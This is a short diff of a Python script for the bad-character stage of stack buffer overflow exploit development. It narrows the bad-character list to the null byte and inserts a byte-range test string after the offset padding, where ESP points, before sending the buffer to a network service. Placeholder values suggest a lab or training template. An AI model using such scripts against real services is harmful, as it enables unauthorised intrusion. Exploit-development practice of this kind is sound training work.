@@ -16,7 +16,7 @@ badchar_test = "" #start with empty string
 
 #determined these to be bad characters, one is a null bye and the other one is new string that will be interpreted by the program
 
-badchars = [0x00, 0x0A, 0x0D]  
+badchars = [0x00]  
 
 #generate the string using a for loop 
 for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
@@ -35,8 +35,10 @@ offset_srp = OFFSET NUMBER
 buf = ""
 buf += "A"*(offset_srp - len(buf)) #padding
 buf += "ZZZZ"
+buf += badchar_test #ESP points here
 buf += "C"*(buf_totlen - len(buf)) #trailing padding
 buf += "\n"
+
 
 #send the message
 s.send("VALUE" + buf)
